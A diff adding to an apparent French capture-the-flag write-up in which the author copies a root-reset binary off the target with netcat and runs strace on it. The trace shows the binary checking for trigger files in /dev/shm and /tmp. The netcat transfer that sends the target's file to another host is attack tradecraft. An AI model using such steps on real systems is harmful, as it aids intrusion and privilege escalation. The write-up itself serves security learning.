@@ -188,3 +188,48 @@ Je me décide donc à le récupérer pour l'analyser en exécutant les commandes
 - Sur la machine qui va réceptionner le fichier : ```nc -l -p 1234 > reset_root```
 - Sur la machine qui va envoyer le fichier : ```nc -w 3 192.168.56.101 1234 < /usr/bin/reset_root```
 
+Après l'avoir récupéré, je le rends exécutable avec ```chmod +x reset_root``` et je l'analyse avec ```strace``` :
+```
+┌──(kali㉿kali)-[~/Téléchargements]
+└─$ strace ./reset_root 
+execve("./reset_root", ["./reset_root"], 0x7fffae1d4240 /* 56 vars */) = 0
+brk(NULL)                               = 0x2277000
+access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (Aucun fichier ou dossier de ce type)
+openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=70467, ...}, AT_EMPTY_PATH) = 0
+mmap(NULL, 70467, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f3522d2c000
+close(3)                                = 0
+openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0000y\2\0\0\0\0\0"..., 832) = 832
+pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
+pread64(3, "\4\0\0\0\20\0\0\0\5\0\0\0GNU\0\2\200\0\300\4\0\0\0\1\0\0\0\0\0\0\0", 32, 848) = 32
+pread64(3, "\4\0\0\0\24\0\0\0\3\0\0\0GNU\0\320\276\243\212\v\307^\t\263h8\371\266h\r\350"..., 68, 880) = 68
+newfstatat(3, "", {st_mode=S_IFREG|0755, st_size=1835120, ...}, AT_EMPTY_PATH) = 0
+mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f3522d2a000
+pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
+mmap(NULL, 1868664, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f3522b61000
+mprotect(0x7f3522b87000, 1654784, PROT_NONE) = 0
+mmap(0x7f3522b87000, 1343488, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x26000) = 0x7f3522b87000
+mmap(0x7f3522ccf000, 307200, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x16e000) = 0x7f3522ccf000
+mmap(0x7f3522d1b000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1b9000) = 0x7f3522d1b000
+mmap(0x7f3522d21000, 33656, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f3522d21000
+close(3)                                = 0
+mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f3522b5f000
+arch_prctl(ARCH_SET_FS, 0x7f3522d2b580) = 0
+mprotect(0x7f3522d1b000, 12288, PROT_READ) = 0
+mprotect(0x403000, 4096, PROT_READ)     = 0
+mprotect(0x7f3522d6d000, 8192, PROT_READ) = 0
+munmap(0x7f3522d2c000, 70467)           = 0
+newfstatat(1, "", {st_mode=S_IFCHR|0600, st_rdev=makedev(0x88, 0x1), ...}, AT_EMPTY_PATH) = 0
+brk(NULL)                               = 0x2277000
+brk(0x2298000)                          = 0x2298000
+write(1, "CHECKING IF RESET TRIGGERS PRESE"..., 38CHECKING IF RESET TRIGGERS PRESENT...
+) = 38
+access("/dev/shm/kHgTFI5G", F_OK)       = -1 ENOENT (Aucun fichier ou dossier de ce type)
+access("/dev/shm/Zw7bV9U5", F_OK)       = -1 ENOENT (Aucun fichier ou dossier de ce type)
+access("/tmp/kcM0Wewe", F_OK)           = -1 ENOENT (Aucun fichier ou dossier de ce type)
+write(1, "RESET FAILED, ALL TRIGGERS ARE N"..., 44RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.
+) = 44
+exit_group(0)                           = ?
++++ exited with 0 +++
+```
